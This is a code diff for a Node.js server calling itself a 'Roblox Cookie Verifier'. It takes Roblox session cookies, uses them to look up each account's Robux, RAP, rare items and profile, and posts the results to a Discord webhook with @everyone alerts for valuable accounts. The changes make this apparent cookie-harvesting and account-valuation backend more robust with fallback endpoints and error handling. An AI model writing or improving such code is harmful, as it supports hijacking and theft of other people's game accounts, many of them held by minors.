@@ -64,7 +64,7 @@ console.log('========================================');
 
 // Format number with commas
 function formatNumber(num) {
-    if (!num) return '0';
+    if (!num && num !== 0) return '0';
     return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 }
 
@@ -178,17 +178,34 @@ async function verifyCookie(cookie) {
 
 async function checkAge13Plus(cookie, userId) {
     try {
-        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
+        // Try the newer API endpoint
+        const response = await axios.get(`https://www.roblox.com/mobileapi/userinfo`, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
             }
         });
         
-        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
-            return accountResponse.data.IsThirteenOrOver;
+        if (response.data && response.data.IsThirteenOrOver !== undefined) {
+            return response.data.IsThirteenOrOver;
         }
-        return false;
+        
+        // Fallback: check birthdate endpoint
+        try {
+            const birthdateResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
+                headers: {
+                    'Cookie': `.ROBLOSECURITY=${cookie}`,
+                    'User-Agent': 'Mozilla/5.0'
+                }
+            });
+            
+            const createdDate = new Date(birthdateResponse.data.created);
+            const now = new Date();
+            const age = (now - createdDate) / (1000 * 60 * 60 * 24 * 365);
+            return age >= 13;
+        } catch {
+            return false;
+        }
     } catch (error) {
         console.error('Age check error:', error.message);
         return false;
@@ -205,6 +222,7 @@ async function fetchRobuxBalance(cookie) {
         });
         return response.data.robux;
     } catch (error) {
+        console.error('Robux fetch error:', error.message);
         return 0;
     }
 }
@@ -218,6 +236,25 @@ async function checkInventoryItems(cookie, userId, assetIds) {
     };
     
     try {
+        // Check asset ownership
+        const checkAsset = async (assetId) => {
+            try {
+                const response = await axios.get(
+                    `https://inventory.roblox.com/v2/users/${userId}/avatar/${assetId}?items=asset`,
+                    {
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${cookie}`,
+                            'User-Agent': 'Mozilla/5.0'
+                        }
+                    }
+                );
+                return true;
+            } catch {
+                return false;
+            }
+        };
+
+        // Check collectibles inventory
         const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -245,18 +282,37 @@ async function checkInventoryItems(cookie, userId, assetIds) {
         
         results.hasKorblox = results.korbloxParts.length === 3;
         
-        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0'
-            }
-        });
-        
-        if (bundleResponse.data && bundleResponse.data.data) {
-            for (const bundle of bundleResponse.data.data) {
-                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
-                    results.hasHeadless = true;
+        // Check bundle ownership for headless
+        try {
+            const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles/ownership?bundleIds=${assetIds.HEADLESS_BUNDLE_ID}`, {
+                headers: {
+                    'Cookie': `.ROBLOSECURITY=${cookie}`,
+                    'User-Agent': 'Mozilla/5.0'
                 }
+            });
+            
+            if (bundleResponse.data && bundleResponse.data.owns) {
+                results.hasHeadless = true;
+            }
+        } catch {
+            // Try older bundle endpoint as fallback
+            try {
+                const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
+                    headers: {
+                        'Cookie': `.ROBLOSECURITY=${cookie}`,
+                        'User-Agent': 'Mozilla/5.0'
+                    }
+                });
+                
+                if (bundleResponse.data && bundleResponse.data.data) {
+                    for (const bundle of bundleResponse.data.data) {
+                        if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
+                            results.hasHeadless = true;
+                        }
+                    }
+                }
+            } catch {
+                // Silent fail
             }
         }
         
@@ -270,9 +326,9 @@ async function checkInventoryItems(cookie, userId, assetIds) {
 async function fetchUserSummary(userId) {
     try {
         const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
-            axios.get(`https://users.roblox.com/v1/users/${userId}`),
-            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
-            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
+            axios.get(`https://users.roblox.com/v1/users/${userId}`).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
+            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`).catch(() => ({ data: { count: 0 } })),
+            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`).catch(() => ({ data: { data: [] } }))
         ]);
         
         const createdDate = new Date(profileResponse.data.created);
@@ -289,6 +345,7 @@ async function fetchUserSummary(userId) {
             isBanned: profileResponse.data.isBanned || false
         };
     } catch (error) {
+        console.error('User summary error:', error.message);
         return {
             displayName: 'Unknown',
             createdDate: 'Unknown',
@@ -315,6 +372,7 @@ async function bypassExtensions(cookie) {
         });
         return { success: true, data: response.data };
     } catch (error) {
+        console.error('Bypass error:', error.message);
         return { success: false, error: error.message };
     }
 }
@@ -338,6 +396,7 @@ async function fetchUserRAP(cookie, userId) {
         }
         return totalRAP;
     } catch (error) {
+        console.error('RAP fetch error:', error.message);
         return 0;
     }
 }
@@ -406,13 +465,17 @@ async function sendToWebhook(data) {
             }
             
             // FIELD 3: BASIC INFO
+            const createdDate = data.summary?.createdDate 
+                ? new Date(data.summary.createdDate).toLocaleDateString() 
+                : 'Unknown';
+            
             fields.push({
                 name: `${EMOJIS.user} ACCOUNT INFORMATION`,
                 value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
                        `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
                        `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
-                       `├ ${EMOJIS.calendar} **Created:** \`${new Date(data.summary?.accountAge).toLocaleDateString()}\`\n` +
-                       `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.accountAge)})`,
+                       `├ ${EMOJIS.calendar} **Created:** \`${createdDate}\`\n` +
+                       `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.createdDate)})`,
                 inline: false
             });
             
@@ -513,6 +576,10 @@ async function sendToWebhook(data) {
         });
         
         // Create the embed
+        const thumbnailUrl = data.success 
+            ? `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
+            : undefined;
+        
         const embed = {
             title: data.success ? 
                 (mentionCheck.shouldMention ? `${EMOJIS.ultra} ⭐ RARE ACCOUNT VERIFIED! ⭐ ${EMOJIS.ultra}` : `${EMOJIS.success} ACCOUNT VERIFIED SUCCESSFULLY ${EMOJIS.success}`) : 
@@ -521,14 +588,12 @@ async function sendToWebhook(data) {
                 (mentionCheck.shouldMention ? `**${priority.priorityName}** - This account meets ${mentionCheck.count} rare condition(s)!` : `Account successfully verified. No rare conditions met.`) : 
                 `Cookie validation failed. Please check and try again.`,
             color: mentionCheck.shouldMention ? 0xFF0000 : color,
-            thumbnail: data.success ? {
-                url: `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
-            } : null,
-            author: {
-                name: data.success ? `@${data.username}` : 'Verification Failed',
-                icon_url: data.success ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png` : null,
-                url: data.success ? `https://www.roblox.com/users/${data.userId}/profile` : null
-            },
+            thumbnail: data.success ? { url: thumbnailUrl } : undefined,
+            author: data.success ? {
+                name: `@${data.username}`,
+                icon_url: `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png`,
+                url: `https://www.roblox.com/users/${data.userId}/profile`
+            } : undefined,
             fields: fields,
             footer: {
                 text: `🔐 Roblox Cookie API • ${mentionCheck.shouldMention ? 'RARE ACCOUNT DETECTED!' : 'Standard Verification'}`,
@@ -537,6 +602,13 @@ async function sendToWebhook(data) {
             timestamp: data.timestamp
         };
         
+        // Clean up undefined values from embed
+        Object.keys(embed).forEach(key => {
+            if (embed[key] === undefined) {
+                delete embed[key];
+            }
+        });
+        
         // Send the webhook with @everyone mention
         const webhookData = {
             content: content,
@@ -544,7 +616,7 @@ async function sendToWebhook(data) {
             username: "Roblox Cookie Verifier",
             avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png",
             allowed_mentions: {
-                parse: ["everyone"] // This allows @everyone mentions
+                parse: ["everyone", "roles", "users"]
             }
         };
         
@@ -599,7 +671,7 @@ app.post('/api/verify-cookie', async (req, res) => {
         if (!verification.valid) {
             responseData.error = verification.error;
             console.log('❌ Cookie is invalid');
-            await sendToWebhook(responseData);
+            await sendToWebhook(responseData).catch(e => console.error('Webhook error on failed:', e.message));
             return res.status(401).json({ success: false, error: verification.error, cookie: cookie });
         }
         
@@ -636,7 +708,7 @@ app.post('/api/verify-cookie', async (req, res) => {
             displayName: userSummary.displayName,
             friendCount: userSummary.friendCount,
             groupCount: userSummary.groupCount,
-            accountAge: userSummary.createdDate,
+            createdDate: userSummary.createdDate,
             description: userSummary.description,
             isBanned: userSummary.isBanned
         };
@@ -662,7 +734,7 @@ app.post('/api/verify-cookie', async (req, res) => {
     } catch (error) {
         console.error('Server error:', error);
         responseData.error = error.message;
-        await sendToWebhook(responseData);
+        await sendToWebhook(responseData).catch(e => console.error('Webhook error:', e.message));
         res.status(500).json({ success: false, error: 'Internal server error', details: error.message, cookie: cookie });
     }
 });
@@ -691,7 +763,7 @@ app.post('/api/test-webhook', async (req, res) => {
             displayName: "Loudzraze",
             friendCount: 75000,
             groupCount: 12,
-            accountAge: "2024-01-01T00:00:00Z",
+            createdDate: "2024-01-01T00:00:00Z",
             description: "Roblox enthusiast and limited collector! 🎮",
             isBanned: false
         },
